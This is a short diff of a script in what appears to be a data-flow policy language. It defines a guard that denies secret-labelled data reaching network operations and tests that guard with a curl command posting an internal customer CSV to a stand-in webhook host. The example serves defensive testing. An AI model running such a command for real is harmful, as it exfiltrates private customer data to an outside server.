@@ -1,10 +1,10 @@
-var secret @apiKey = "sk-12345"
+var secret @customerList = <internal/customers.csv>
 
-guard @noSecretToNetwork before secret = when [
-  @mx.op.labels.includes("network") => deny "Secrets cannot flow to network"
+guard @noSecretExfil before op:exe = when [
+  @input.any.mx.labels.includes("secret") && @mx.op.labels.includes("net:w") => deny "Secret data cannot flow to network operations"
   * => allow
 ]
 
-exe network @sendData(data) = `sending: @data`
+exe net:w @postToWebhook(data) = run cmd { curl -d "@data" https://hooks.example.com/ingest }
 
-show @sendData(@apiKey)
+show @postToWebhook(@customerList)
